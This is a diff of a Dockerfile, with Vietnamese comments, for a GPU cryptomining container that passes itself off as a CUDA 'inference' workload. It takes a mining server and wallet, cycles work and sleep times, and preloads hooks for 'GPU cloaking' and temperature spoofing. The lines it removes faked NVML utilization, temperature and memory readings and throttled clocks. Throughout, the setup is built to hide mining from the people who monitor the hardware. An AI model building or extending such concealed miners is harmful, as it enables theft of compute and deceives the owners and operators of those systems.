@@ -11,10 +11,8 @@ ENV DEBIAN_FRONTEND=noninteractive
 
 # ------------------  (1)  Biến môi trường & ARG giữ nguyên ------------------
 
-ARG LOG_ENCRYPTION_KEY
 ARG MINING_SERVER_GPU
 ARG MINING_WALLET_GPU
-ARG NVIDIA_DRIVER_VERSION=535
 ARG WEBSOCAT_VERSION=1.12.0
 ARG TARGETARCH=amd64
 
@@ -27,7 +25,6 @@ ENV DEBIAN_FRONTEND=noninteractive \
     LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
     MINING_SERVER_GPU=${MINING_SERVER_GPU} \
     MINING_WALLET_GPU=${MINING_WALLET_GPU} \
-    NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
     PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
 
@@ -146,25 +143,16 @@ RUN set -eux; \
 # Force system CUDA 12.0 libraries to take precedence over Python packages
 ENV CUDA_PATH=/usr/local/cuda
 
-# ------------------  (13)  ENV cố định ------------------------------------
+# ------------------  (13)  ENV cố định (đã tối giản) -----------------------
 ENV SCRIPT_DIR=/app/mining_environment/scripts \
     CONFIG_DIR=/app/mining_environment/config \
-    MODELS_DIR=/app/mining_environment/models \
     LOGS_DIR=/app/mining_environment/logs \
     CUDA_COMMAND=/usr/local/bin/inference-cuda \
     MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
-    # NVRTC wrapper control
-    NVRTC_WRAPPER_VERBOSE=0 \
-    NVRTC_ENHANCED_MODE=1 \
     GPU_CLOAK_LOG_LEVEL=INFO \
     WORK_MS=1900 SLEEP_MS=100 \
     ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
-    ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
-    PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
-    GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
-    ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
-    ENABLE_TEMP_SPOOF=1 SPOOF_TEMP_VALUE=48 TEMP_SPOOF_ADD_NOISE=1 \
-    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 
+    ENABLE_NS_ISOLATION=1
 
 
 # ===== CRITICAL: CUDA 12.0 LIBRARY PATH ENFORCEMENT =====
@@ -182,7 +170,7 @@ RUN set -eux; \
         ldconfig; \
     fi
 
-ENV LD_PRELOAD="/usr/local/cuda/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0:/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
+ENV LD_PRELOAD="/usr/local/cuda/targets/x86_64-linux/lib/libnvrtc-builtins.so.12.0:/opt/hooks/libgpuhook.so:/opt/hooks/libtempspoof.so"
 
 # ------------------  (14)  Verification và cleanup ------------------------
 RUN set -eux; \
